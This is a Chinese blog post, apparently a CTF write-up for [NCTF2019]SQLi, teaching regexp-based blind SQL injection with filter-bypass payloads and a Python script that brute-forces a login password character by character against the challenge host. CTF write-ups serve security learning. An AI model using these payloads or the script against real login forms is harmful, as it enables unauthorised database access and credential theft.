@@ -1,0 +1,371 @@
+<!DOCTYPE HTML>
+<html class="no-js" lang="zh-CN">
+<head>
+    <!--[if lte IE 9]>
+<meta http-equiv="refresh" content="0;url=http://george186.github.io/warn.html">
+<![endif]-->
+<meta charset="utf-8">
+<meta http-equiv="X-DNS-Prefetch-Control" content="on">
+<link rel="dns-prefetch" href="http://george186.github.io">
+<link rel="dns-prefetch" href="//www.google-analytics.com">
+<link rel="prefetch" href="http://george186.github.io">
+<link rel="prefetch" href="//www.google-analytics.com">
+
+
+<link rel="prerender" href="http://george186.github.io">
+
+<meta http-equiv="X-UA-Compatible" content="IE=Edge">
+<meta name="renderer" content="webkit">
+<meta name="viewport" content="width=device-width, initial-scale=1.0,user-scalable=no">
+<meta http-equiv="mobile-agent" content="format=html5; url=http://george186.github.io">
+<meta name="author" content="John Doe">
+
+<link rel="stylesheet" href="/css/JSimple.css">
+
+
+<link rel="shortcut icon" href="/images/favicon.png">
+
+
+<title>日常练习39——正则注入 - Hexo</title>
+
+<meta name="keywords" content="">
+
+<meta name="description " content="">
+
+    <script type="text/x-mathjax-config">
+        MathJax.Hub.Config({
+            tex2jax: {
+                inlineMath: [ ['$','$'], ["\\(","\\)"] ],
+                processEscapes: true
+            }
+        });
+    </script>
+
+
+    
+
+    
+
+<meta name="generator" content="Hexo 5.2.0"></head>
+<body>
+<div id="nav">
+    <nav class="nav-menu">
+        <a class="site-name current" href="/" title="说">说</a>
+        <a class="site-index current" href="/"><i class="fa fa-home"></i><span>Home</span></a>
+        <a href="/archives" title="Archives"><i class="fa fa-archives"></i><span>Archives</span></a>
+        <a href="/tags" title="Tags"><i class="fa fa-tags"></i><span>Tags</span></a>
+        <!-- custom single page of menus -->
+        
+        
+        <a href="/help" title="帮助">
+            <i class="fa fa-question-circle"></i>
+            <span>帮助</span>
+        </a>
+        
+    </nav>
+</div>
+
+<div class="nav-user">
+    <a class="btn-search" href="#"><i class="fa fa-search"></i></a>
+    <a class="btn-read-mode" href="#"><i class="fa fa-sun-o"></i></a>
+    <a class="btn-sns-qr" href="javascript:"><i class="fa fa-weixin"></i></a>
+</div>
+
+<div id="wrapper" class="clearfix">
+    <div id="body">
+        <div class="main" id="main">
+            <div id="cover">
+    <div class="cover-img"></div>
+    <div class="cover-info">
+        
+        <h1 class="cover-siteName">说IT</h1>
+        <h3 class="cover-siteTitle">用代码摇滚这个世界</h3>
+        <p class="cover-siteDesc">一个关注技术与人文的IT博客</p>
+        <div class="cover-sns">
+            
+    &nbsp;&nbsp;<div class="btn btn-github">
+        <a href="https://github.com/tangkunyin" target="_blank" title="github" ref="friend">
+            <i class="fa fa-github"></i>
+        </a>
+    </div>
+
+    &nbsp;&nbsp;<div class="btn btn-twitter">
+        <a href="https://twitter.com/tangkunyin" target="_blank" title="twitter" ref="friend">
+            <i class="fa fa-twitter"></i>
+        </a>
+    </div>
+
+    &nbsp;&nbsp;<div class="btn btn-weibo">
+        <a href="https://weibo.com/tangkunyin" target="_blank" title="weibo" ref="friend">
+            <i class="fa fa-weibo"></i>
+        </a>
+    </div>
+
+    &nbsp;&nbsp;<div class="btn btn-instagram">
+        <a href="https://www.instagram.com/mtangsir/" target="_blank" title="instagram" ref="friend">
+            <i class="fa fa-instagram"></i>
+        </a>
+    </div>
+
+
+        </div>
+    </div>
+</div>
+
+            <div class="page-title">
+    <ul>
+        <li><a href="/">Recent Posts</a></li>
+        
+            
+                <li class="">
+                    <a href="/categories/tech-notes" data-name="技术">技术</a>
+                </li>
+            
+                <li class="">
+                    <a href="/categories/huma" data-name="人文">人文</a>
+                </li>
+            
+        
+        <li class="page-search">
+    <form id="search" class="search-form">
+        <input type="text"
+               readonly="readonly"
+               id="local-search-input-tip"
+               placeholder="click to search..." />
+        <button type="button" disabled="disabled" class="search-form-submit"><i class="fa fa-search"></i></button>
+    </form>
+</li>
+
+    </ul>
+</div>
+<div class="main-inner">
+    <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+        <div class="post-header">
+            <div class="post-author clearfix">
+                <a class="avatar fleft" href="https://george186.github.io"
+                   target="_blank">
+                    <img width="48" src="/images/favicon.png" alt="avatar"/>
+                </a>
+                <p><span class="label">Author</span>
+                    <a href="https://george186.github.io"
+                       target="_blank">george</a>
+                    <span title="Last edited at&nbsp;2021-07-27">2021-07-27</span>
+                </p>
+                <p>一个写代码的「伪文人」</p>
+            </div>
+            <h2 class="post-title">日常练习39——正则注入</h2>
+            <div class="post-meta">
+                emm... 4209 words in the article |
+                you are the&nbsp;<span id="busuanzi_value_page_pv"><i class="fa fa-spinner fa-spin"></i></span>th friend who reading now
+            </div>
+        </div>
+        <div class="post-content markdown-body">
+            <p>今天又扩充了sql注入方式——正则注入。  </p>
+<h1 id="NCTF2019-SQLi"><a href="#NCTF2019-SQLi" class="headerlink" title="[NCTF2019]SQLi"></a>[NCTF2019]SQLi</h1><p>其实正则注入之前打比赛也碰到过，但是当时没有来得及总结，今天又做到了一道这样的题目，就详细的说一下。  </p>
+<p>打开题目就可以看到它已经给出了sql后台注入的语句。并且这道题我们可以通过查看robots.txt来得到提示。提示在hint.php里。  </p>
+<p><a target="_blank" rel="noopener" href="https://pic.imgdb.cn/item/61001ef25132923bf8ba6900.png"><img src="https://pic.imgdb.cn/item/61001ef25132923bf8ba6900.png"></a>  </p>
+<p>可以看到过滤了很多常规的sql注入字符。但是这里却没有过滤正则注入的关键字符： regexp。接下来就讲一下正则注入。  </p>
+<h2 id="正则注入"><a href="#正则注入" class="headerlink" title="正则注入"></a>正则注入</h2><p>其实正则注入很简单，它依靠的就是regexp这个函数，它支持正则表达式匹配。  </p>
+<p>比如说下面的例子：  </p>
+<pre><code>判断第一个表名的第一个字符是否在a-z之间
+
+?id=1 and 1=(SELECT 1 FROM information_schema.tables WHERE TABLE_SCHEMA=&quot;blind_sqli&quot; AND table_name REGEXP &#39;^[a-z]&#39; LIMIT 0,1) /*
+
+
+REGEXP &#39;^[a-z]&#39;即是匹配正则表达式，^表示匹配字符串的开始，[a-z]即匹配字母a-z
+
+判断第一个表名的第一个字符是n
+
+index.php?id=1 and 1=(SELECT 1 FROM information_schema.tables WHERE TABLE_SCHEMA=&quot;blind_sqli&quot; AND table_name REGEXP &#39;^n&#39; LIMIT 0,1) /*</code></pre>
+<p>可以看到regexp的用法，即regexp ‘^要匹配的字符’。我们利用regexp的正则匹配机制加上and或or就可以利用不同的回显进行注入了。  </p>
+<p>举个简单的例子：  </p>
+<pre><code>例如security数据库的表有多个，users，email等
+
+
+
+select * from users where id=1 and 1=(select 1 from information_schema.tables where table_schema=&#39;security&#39; and table_name regexp &#39;^u[a-z]&#39; limit 0,1);是正确的
+
+
+
+select * from users where id=1 and 1=(select 1 from information_schema.tables where table_schema=&#39;security&#39; and table_name regexp &#39;^us[a-z]&#39; limit 0,1);是正确的
+
+
+
+select * from users where id=1 and 1=(select 1 from information_schema.tables where table_schema=&#39;security&#39; and table_name regexp &#39;^em[a-z]&#39; limit 0,1);是正确的
+
+
+
+select * from users where id=1 and 1=(select 1 from information_schema.tables where table_schema=&#39;security&#39; and table_name regexp &#39;^us[a-z]&#39; limit 1,1);不正确
+
+
+
+select * from users where id=1 and 1=(select 1 from information_schema.tables where table_schema=&#39;security&#39; and table_name regexp &#39;^em[a-z]&#39; limit 1,1);不正确
+
+实验表明：在limit 0,1下，regexp会匹配所有的项。我们在使用regexp时，要注意有可能有多个项，同时要一个个字符去**。类似于上述第一条和第二条。而此时limit 0,1此时是对于where table_schema=&#39;security&#39; limit 0,1。table_schema=&#39;security&#39;已经起到了限定作用了，limit有没有已经不重要了。limit 作用在前面的 select 语句中，而不是 regexp。</code></pre>
+<p>但是在具体的题目中我们还是要变化注入的方式的了。  </p>
+<p>在这道题目中已经给出了sql后台注入语句，并且提示中也已经说了，只要密码正确就可以得到flag，所以说我们只需要爆出密码即可。  </p>
+<p>如何构造sql注入呢，这是这道题的重点。  </p>
+<p>我们又要用到转义字符\了。  </p>
+<p>这样构造：  </p>
+<pre><code>username=\&amp;passwd=||/**/passwd/**/regexp/**/&quot;^a&quot;;%00  </code></pre>
+<p>这里用/**/来代替空格的过滤,||来代替or，%00来代替–，#注释符。（这些都是常规的代替技巧）  </p>
+<p>那么我们的后台注入语句就变成了这样：  </p>
+<pre><code>select * from users where username=&#39;\&#39; and passwd=&#39;||/**/passwd/**/regexp/**/&quot;^a&quot;;%00  </code></pre>
+<p>因为转义符\的存在\后的单引号’被转义那么闭合的单引号顺延一个，所以username的值实际上是&#39; and passwd=，整个sql语句变成了这样：  </p>
+<pre><code>select * from users where username=   &#39;\&#39; and passwd=&#39;      ||     /**/passwd/**/regexp/**/&quot;^a&quot;;%00  </code></pre>
+<p>而我们就可以通过正则匹配regexp并且不断改变字符从而得到完整密码。  </p>
+<p>接下来就是看一下正确回显是什么，从而编写脚本来爆破。这里我们可以用抓包爆破来查看。   </p>
+<p><a target="_blank" rel="noopener" href="https://pic.imgdb.cn/item/610026385132923bf8dd7163.png"><img src="https://pic.imgdb.cn/item/610026385132923bf8dd7163.png"></a>  </p>
+<p>通过爆破可以看到第一个字母是y，接着查看正确的回显页面。  </p>
+<p><a target="_blank" rel="noopener" href="https://pic.imgdb.cn/item/610026675132923bf8de5a40.png"><img src="https://pic.imgdb.cn/item/610026675132923bf8de5a40.png"></a>  </p>
+<p>可以看到正确回显有一个welcom.php，那么我们就可以以此来编写脚本。  </p>
+<pre><code>import requests
+import time
+from urllib import parse
+
+s = &#39;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!#$%&amp;(),-./:;&lt;=&gt;@[\]_`&#123;|&#125;~&#39;
+
+flag=&#39;&#39;
+for i in range(1,100):
+for j in s:
+    url=&#39;http://d4dc31f0-ee38-41f1-a3ec-e4eac1ebebe1.node4.buuoj.cn/index.php&#39;
+    header=&#123;
+        &#39;User-Agent&#39;: &#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36&#39;,
+        &#39;Origin&#39;: &#39;http://d4dc31f0-ee38-41f1-a3ec-e4eac1ebebe1.node4.buuoj.cn&#39;,
+        &#39;Referer&#39;: &#39;http://d4dc31f0-ee38-41f1-a3ec-e4eac1ebebe1.node4.buuoj.cn/index.php&#39;
+    &#125;
+    print(flag+j)
+    data = &#123;&#39;passwd&#39;:&quot;||/**/passwd/**/regexp/**/\&quot;^&#123;&#125;\&quot;;&#123;&#125;&quot;.format(flag+j,parse.unquote(&#39;%00&#39;)),&quot;username&quot;:&quot;\\&quot;&#125;
+
+    # data = &#123;&#39;passwd&#39;: &quot;||/**/username/**/regexp/**/\&quot;^&#123;&#125;\&quot;;&#123;&#125;&quot;.format(flag + j, parse.unquote(&#39;%00&#39;)),&quot;username&quot;: &quot;\\&quot;&#125;
+    print(data)
+    r = requests.post(url=url, data=data,headers=header)
+    if &quot;welcome.php&quot; in r.text:
+        flag +=j
+        print(flag)
+        break
+    test = flag
+
+print(flag)   </code></pre>
+<p>因为已经说过只需要密码即可，那么我们直接爆出密码就可以登录得到flag。   </p>
+<p><a target="_blank" rel="noopener" href="https://pic.imgdb.cn/item/610026f95132923bf8e13a22.png"><img src="https://pic.imgdb.cn/item/610026f95132923bf8e13a22.png"></a>   </p>
+<p>可以看到密码有大小写，这里就要说一个小细节，那就是regexp是不区分大小写的，所以我们要将结果转成小写。然后登录得到flag。  </p>
+<h1 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h1><p>正则注入原理就在regexp这个正则表达式的匹配上，并不难理解，重点还是如何构造和如何写脚本，sql注入大都难在这两点上。   </p>
+<p>参考文章：  </p>
+<p><a target="_blank" rel="noopener" href="https://www.freesion.com/article/2367234678/">SQL正则盲注-regexp</a></p>
+
+            
+                
+
+            
+        </div>
+        <div class="post-tool">
+            <a class="btn-thumbs-up" href="javascript:void(0);" data-cid="52" title="95">
+                <i class="fa fa-thumbs-up" aria-hidden="true"></i> Donate
+            </a>
+        </div>
+        
+        <div class="post-tags">Tags：
+            
+            <a href="/tags/%E7%BB%83%E4%B9%A0/">练习</a>
+            
+        </div>
+        
+    </article>
+    
+        <p style="text-align: center">This article just represents my own viewpoint. If there is something wrong, please correct me.</p>
+    
+    
+    
+
+</div>
+
+<script src="/js/busuanzi.pure.mini.js"></script>
+
+
+
+        </div><!-- end #main-->
+    </div><!-- end #body -->
+    <footer class="footer">
+    <div class="footer-inner" style="text-align: center">
+        <p>
+            <a href="/about"  title="About">About</a>&nbsp;&nbsp<em>·</em>&nbsp;&nbsp
+            <!-- 自定义链接 -->
+            <a href="/help" title="Help" >Help</a>&nbsp;&nbsp<em>·</em>&nbsp;&nbsp
+            <a href="/links" title="Links">Links</a>&nbsp;&nbsp<em>·</em>&nbsp;&nbsp
+            <a href="/sitemap.xml" title="SiteMap">SiteMap</a>
+        </p>
+        <p>
+            Has been established&nbsp<a href="/timeline" id="siteBuildingTime"></a>&nbspDays，<a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank" rel="licence">Based on Attribution-NonCommercial-ShareAlike 4.0 International (CC BY-NC-SA 4.0)</a><br/>
+            ©2017-<span id="cpYear"></span> Based on&nbsp<a href="http://hexo.io" target="_blank" rel="nofollow">Hexo</a>
+            ，Theme by&nbsp&nbsp<a href="https://github.com/tangkunyin/hexo-theme-jsimple" target="_blank" rel="bookmark">JSimple</a>
+            ，Author&nbsp<a href="https://george186.github.io" target="_blank" rel="friend">george</a>
+            ，Hosted by <a href="https://pages.github.com/" target="_blank" rel="nofollow">GitHub Pages</a>
+        </p>
+    </div>
+</footer>
+
+<script src="/js/zepto.min.js"></script>
+
+
+<script src="/js/SimpleCore.js"></script>
+
+
+</div>
+<!-- search pop -->
+<div class="popup search-popup local-search-popup">
+    <div class="local-search-header clearfix">
+        <span class="search-icon">
+            <i class="fa fa-search"></i>
+        </span>
+        <span class="popup-btn-close">
+            <i class="fa fa-times-circle"></i>
+        </span>
+        <div class="local-search-input-wrapper">
+            <input id="local-search-input"
+                   spellcheck="false"
+                   type="text"
+                   autocomplete="off"
+                   placeholder="Input query keywords here..."/>
+        </div>
+    </div>
+    <div id="local-search-result"></div>
+</div>
+<div class="fixed-btn">
+    <a class="btn-gotop" href="javascript:"> <i class="fa fa-angle-up"></i></a>
+</div>
+<script>
+    $(function () {
+        var jsi_config = {
+            rootUrl: 'http://george186.github.io/',
+            buildingTime: '01/20/2018',
+            current: $('.post-tags').length > 0 ? 'post' : 'archive',
+            snsQRCode: '/images/sns-qrcode.png',
+            donateImg: '/images/donate-qr.png',
+            localSearch: { dbPath: '' },
+            readMode: 'day'
+        };
+        
+            jsi_config.localSearch = {
+                dbPath: '/search.xml',
+                trigger: 'auto',
+                topN: '1',
+                unescape: 'false'
+            }
+        
+        SimpleCore.init(jsi_config);
+        
+        var bp = document.createElement('script');
+        var curProtocol = window.location.protocol.split(':')[0];
+        if (curProtocol === 'https') {
+            bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+        } else {
+            bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+        }
+        var s = document.getElementsByTagName("script")[0];
+        s.parentNode.insertBefore(bp, s);
+        
+    });
+</script>
+</body>
+</html>
